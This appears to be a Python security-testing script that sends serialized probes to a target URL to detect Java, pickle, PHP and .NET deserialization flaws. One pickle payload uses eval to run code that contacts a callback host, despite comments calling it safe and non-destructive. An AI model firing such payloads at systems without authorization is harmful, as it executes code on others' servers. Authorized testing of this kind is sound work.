#!/usr/bin/env python3
"""Deserialization vulnerability testing (non-destructive).

Tests for Java, Python, PHP, and .NET deserialization issues.
Uses DNS callback detection, timing analysis, and error-based detection.

Usage:
    python3 test-deserialization.py '{"target": "https://example.com/api", "content_type": "application/x-java-serialized-object", "callback_domain": "burpcollaborator.net"}'
"""

import sys
import json
import base64
import time
import struct
import requests
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 15


# Java serialization magic bytes
JAVA_MAGIC = b"\xac\xed\x00\x05"

# Minimal Java serialized object (string "test")
JAVA_STRING_PAYLOAD = (
    JAVA_MAGIC +
    b"\x74\x00\x04test"
)

# Java serialized null
JAVA_NULL = JAVA_MAGIC + b"\x70"


def generate_java_dns_payload(callback_domain):
    """Generate a Java serialized URL object that triggers DNS lookup.

    This creates a minimal serialized java.net.URL object. When deserialized,
    Java's URL.hashCode() triggers a DNS lookup.

    Note: This is a simplified payload. Real-world testing would use ysoserial.
    """
    # Simplified: We'll use a serialized string that might trigger processing
    # In production, you'd use ysoserial-generated payloads
    url_str = f"http://{callback_domain}/java-deser-test"
    payload = JAVA_MAGIC + b"\x74" + struct.pack(">H", len(url_str)) + url_str.encode()
    return payload


def generate_python_pickle_payload(callback_domain):
    """Generate a Python pickle payload that triggers DNS lookup via urllib."""
    import pickle
    import os

    # Safe detection payload - just creates a string (non-destructive)
    # The real test is whether the server processes pickle at all
    class DNSProbe:
        def __reduce__(self):
            # This would trigger DNS lookup if deserialized
            # We use a safe import to detect pickle processing
            return (
                eval,
                (f"__import__('urllib.request').request.urlopen('http://{callback_domain}/pickle-test') or 'ok'",)
            )

    try:
        payload = pickle.dumps(DNSProbe(), protocol=2)
    except Exception:
        # Fallback: simple pickle that's still detectable
        payload = pickle.dumps({"test": "deserialization", "callback": callback_domain}, protocol=2)

    return payload


def generate_php_payload(callback_domain):
    """Generate PHP serialized object for testing."""
    # PHP serialized string
    payload = f'O:8:"stdClass":1:{{s:4:"test";s:4:"true";}}'.encode()
    return payload


def generate_dotnet_payload():
    """Generate .NET ViewState-like payload for detection."""
    # Simplified .NET BinaryFormatter header
    payload = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00"
    payload += b"\x00\x00\x00\x00"
    return payload


def test_java_deserialization(target, headers, callback_domain=None):
    """Test for Java deserialization vulnerabilities."""
    results = []

    payloads = [
        ("java_magic_bytes", JAVA_MAGIC + b"\x70", "application/x-java-serialized-object",
         "Minimal Java serialized null object"),
        ("java_string", JAVA_STRING_PAYLOAD, "application/x-java-serialized-object",
         "Java serialized string"),
        ("java_base64", None, "text/plain",
         "Base64-encoded Java serialized object"),
    ]

    if callback_domain:
        dns_payload = generate_java_dns_payload(callback_domain)
        payloads.append(("java_dns_callback", dns_payload, "application/x-java-serialized-object",
                         "Java object with DNS callback"))

    for name, payload, ct, description in payloads:
        req_headers = dict(headers)
        req_headers["Content-Type"] = ct

        if name == "java_base64":
            payload = base64.b64encode(JAVA_STRING_PAYLOAD)
        elif payload is None:
            continue

        start = time.monotonic()
        try:
            resp = requests.post(
                target, data=payload, headers=req_headers,
                timeout=TIMEOUT, verify=False,
            )
            elapsed = time.monotonic() - start

            result = {
                "test": name,
                "description": description,
                "status_code": resp.status_code,
                "content_length": len(resp.content),
                "elapsed": round(elapsed, 3),
                "response_preview": resp.text[:300],
                "indicators": [],
            }

            # Check for Java-specific error messages
            body = resp.text.lower()
            java_indicators = [
                "java.io.invalidclassexception",
                "java.io.streamcorruptedexception",
                "java.lang.classnotfoundexception",
                "java.io.objectinputstream",
                "deseriali",
                "classloader",
                "java.rmi",
                "javax.management",
                "org.apache.commons",
                "stacktrace",
                "serialversionuid",
            ]
            for indicator in java_indicators:
                if indicator in body:
                    result["indicators"].append(indicator)

            result["java_deserialization_detected"] = len(result["indicators"]) > 0
            results.append(result)

        except requests.RequestException as e:
            results.append({"test": name, "error": str(e)})

    return {"language": "java", "results": results}


def test_python_deserialization(target, headers, callback_domain=None):
    """Test for Python pickle deserialization vulnerabilities."""
    results = []

    # Basic pickle payloads
    import pickle
    basic_pickle = pickle.dumps({"test": True}, protocol=2)
    basic_pickle_p0 = pickle.dumps({"test": True}, protocol=0)

    payloads = [
        ("pickle_binary", basic_pickle, "application/x-python-pickle",
         "Binary pickle (protocol 2)"),
        ("pickle_ascii", basic_pickle_p0, "application/x-python-pickle",
         "ASCII pickle (protocol 0)"),
        ("pickle_base64", base64.b64encode(basic_pickle), "text/plain",
         "Base64-encoded pickle"),
    ]

    if callback_domain:
        dns_payload = generate_python_pickle_payload(callback_domain)
        payloads.append(("pickle_dns", dns_payload, "application/x-python-pickle",
                         "Pickle with DNS callback"))

    for name, payload, ct, description in payloads:
        req_headers = dict(headers)
        req_headers["Content-Type"] = ct

        start = time.monotonic()
        try:
            resp = requests.post(
                target, data=payload, headers=req_headers,
                timeout=TIMEOUT, verify=False,
            )
            elapsed = time.monotonic() - start

            result = {
                "test": name,
                "description": description,
                "status_code": resp.status_code,
                "content_length": len(resp.content),
                "elapsed": round(elapsed, 3),
                "response_preview": resp.text[:300],
                "indicators": [],
            }

            body = resp.text.lower()
            python_indicators = [
                "unpicklingerror",
                "pickle",
                "cPickle",
                "attributeerror",
                "modulenotfounderror",
                "importerror",
                "__reduce__",
                "marshal",
                "yaml.load",
            ]
            for indicator in python_indicators:
                if indicator.lower() in body:
                    result["indicators"].append(indicator)

            result["pickle_processing_detected"] = len(result["indicators"]) > 0
            results.append(result)

        except requests.RequestException as e:
            results.append({"test": name, "error": str(e)})

    return {"language": "python", "results": results}


def test_php_deserialization(target, headers):
    """Test for PHP unserialize vulnerabilities."""
    results = []

    payloads = [
        ("php_object", b'O:8:"stdClass":1:{s:4:"test";s:4:"true";}',
         "application/x-php-serialized", "PHP serialized stdClass"),
        ("php_array", b'a:1:{s:4:"test";s:4:"true";}',
         "application/x-php-serialized", "PHP serialized array"),
        ("php_boolean_true", b'b:1;',
         "text/plain", "PHP serialized boolean"),
        ("php_phar", b'__HALT_COMPILER();',
         "application/octet-stream", "PHAR archive header"),
    ]

    for name, payload, ct, description in payloads:
        req_headers = dict(headers)
        req_headers["Content-Type"] = ct

        start = time.monotonic()
        try:
            resp = requests.post(
                target, data=payload, headers=req_headers,
                timeout=TIMEOUT, verify=False,
            )
            elapsed = time.monotonic() - start

            result = {
                "test": name,
                "description": description,
                "status_code": resp.status_code,
                "elapsed": round(elapsed, 3),
                "response_preview": resp.text[:300],
                "indicators": [],
            }

            body = resp.text.lower()
            php_indicators = [
                "unserialize",
                "__wakeup",
                "__destruct",
                "phar://",
                "fatal error",
                "php warning",
                "php notice",
                "class not found",
            ]
            for indicator in php_indicators:
                if indicator in body:
                    result["indicators"].append(indicator)

            result["php_deserialization_detected"] = len(result["indicators"]) > 0
            results.append(result)

        except requests.RequestException as e:
            results.append({"test": name, "error": str(e)})

    return {"language": "php", "results": results}


def test_dotnet_deserialization(target, headers):
    """Test for .NET deserialization vulnerabilities."""
    results = []

    payloads = [
        ("dotnet_binary", generate_dotnet_payload(),
         "application/x-ms-application", ".NET BinaryFormatter header"),
        ("dotnet_viewstate", b"__VIEWSTATE=",
         "application/x-www-form-urlencoded", "ASP.NET ViewState probe"),
    ]

    for name, payload, ct, description in payloads:
        req_headers = dict(headers)
        req_headers["Content-Type"] = ct

        start = time.monotonic()
        try:
            resp = requests.post(
                target, data=payload, headers=req_headers,
                timeout=TIMEOUT, verify=False,
            )
            elapsed = time.monotonic() - start

            result = {
                "test": name,
                "description": description,
                "status_code": resp.status_code,
                "elapsed": round(elapsed, 3),
                "response_preview": resp.text[:300],
                "indicators": [],
            }

            body = resp.text.lower()
            dotnet_indicators = [
                "system.runtime.serialization",
                "binaryformatter",
                "objectstateformatter",
                "viewstate",
                "typeinitializationexception",
                "serializationexception",
                ".net",
                "system.web",
            ]
            for indicator in dotnet_indicators:
                if indicator in body:
                    result["indicators"].append(indicator)

            result["dotnet_deserialization_detected"] = len(result["indicators"]) > 0
            results.append(result)

        except requests.RequestException as e:
            results.append({"test": name, "error": str(e)})

    return {"language": "dotnet", "results": results}


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: test-deserialization.py '{\"target\": \"...\"}' "}))
        sys.exit(1)

    try:
        args = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON arguments: {str(e)}"}))
        sys.exit(1)

    target = args.get("target")
    if not target:
        print(json.dumps({"error": "Missing required parameter: target"}))
        sys.exit(1)

    content_type = args.get("content_type", "")
    callback_domain = args.get("callback_domain")
    headers = args.get("headers", {})
    languages = args.get("languages", ["java", "python", "php", "dotnet"])

    all_results = {}
    all_indicators = []

    if "java" in languages:
        java_results = test_java_deserialization(target, headers, callback_domain)
        all_results["java"] = java_results
        for r in java_results["results"]:
            if r.get("java_deserialization_detected"):
                all_indicators.extend(r.get("indicators", []))

    if "python" in languages:
        python_results = test_python_deserialization(target, headers, callback_domain)
        all_results["python"] = python_results
        for r in python_results["results"]:
            if r.get("pickle_processing_detected"):
                all_indicators.extend(r.get("indicators", []))

    if "php" in languages:
        php_results = test_php_deserialization(target, headers)
        all_results["php"] = php_results
        for r in php_results["results"]:
            if r.get("php_deserialization_detected"):
                all_indicators.extend(r.get("indicators", []))

    if "dotnet" in languages:
        dotnet_results = test_dotnet_deserialization(target, headers)
        all_results["dotnet"] = dotnet_results
        for r in dotnet_results["results"]:
            if r.get("dotnet_deserialization_detected"):
                all_indicators.extend(r.get("indicators", []))

    unique_indicators = list(set(all_indicators))

    severity = "info"
    if unique_indicators:
        severity = "high"

    total_tests = sum(
        len(lang_result.get("results", []))
        for lang_result in all_results.values()
    )

    output = {
        "target": target,
        "languages_tested": languages,
        "total_tests": total_tests,
        "indicators_found": unique_indicators,
        "severity": severity,
        "callback_domain": callback_domain,
        "results": all_results,
        "summary": (
            f"Tested {total_tests} deserialization payloads across {len(languages)} languages against {target}. "
            f"Indicators found: {unique_indicators if unique_indicators else 'none'}."
        ),
        "note": "Deserialization testing is heuristic-based. Manual verification with tools like ysoserial is recommended for confirmed findings.",
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
